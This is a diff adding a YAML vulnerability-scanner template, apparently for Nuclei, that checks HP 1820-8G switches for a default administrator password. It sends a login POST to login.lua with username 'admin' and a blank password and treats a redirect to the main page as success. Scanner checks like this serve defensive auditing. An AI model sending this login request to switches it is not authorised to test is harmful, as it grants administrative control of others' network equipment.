@@ -1,0 +1,29 @@
+id: hp-1820-8g-default-password
+info:
+  name: HP 1820-8G Switch Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HP 1820-8G Switch J9979A has a default password vulnerability affecting the `login.lua` endpoint, allowing attackers to gain administrative access.
+  tags: default-password, hp
+  reference:
+    - https://support.hpe.com/hpesc/public/docDisplay?docId=a00077779en_us&docLocale=en_US
+http:
+  - raw:
+      - |
+        POST /htdocs/login/login.lua HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"redirect": "/htdocs/pages/main/main.lsp"'
+          - '"error": ""'
